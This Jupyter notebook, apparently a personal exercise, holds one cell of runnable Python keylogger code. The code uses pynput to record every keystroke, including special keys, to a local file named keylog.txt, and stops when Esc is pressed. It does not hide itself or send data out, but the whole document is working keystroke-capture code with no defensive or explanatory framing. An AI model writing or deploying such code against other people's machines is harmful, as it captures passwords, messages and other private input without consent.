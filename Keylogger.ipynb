{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "01d0140d-96e4-4740-8b86-1541d7987af7",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard\n",
    "\n",
    "# File to log the keystrokes\n",
    "log_file = \"keylog.txt\"\n",
    "\n",
    "# Function to write keystrokes to the file\n",
    "def on_press(key):\n",
    "    try:\n",
    "        with open(log_file, \"a\") as f:\n",
    "            f.write(f\"{key.char}\")\n",
    "    except AttributeError:\n",
    "        with open(log_file, \"a\") as f:\n",
    "            if key == keyboard.Key.space:\n",
    "                f.write(\" \")\n",
    "            else:\n",
    "                f.write(f\" [{key.name}] \")\n",
    "\n",
    "# Function to stop the keylogger\n",
    "def on_release(key):\n",
    "    if key == keyboard.Key.esc:\n",
    "        # Stop listener\n",
    "        return False\n",
    "\n",
    "# Set up the listener\n",
    "with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
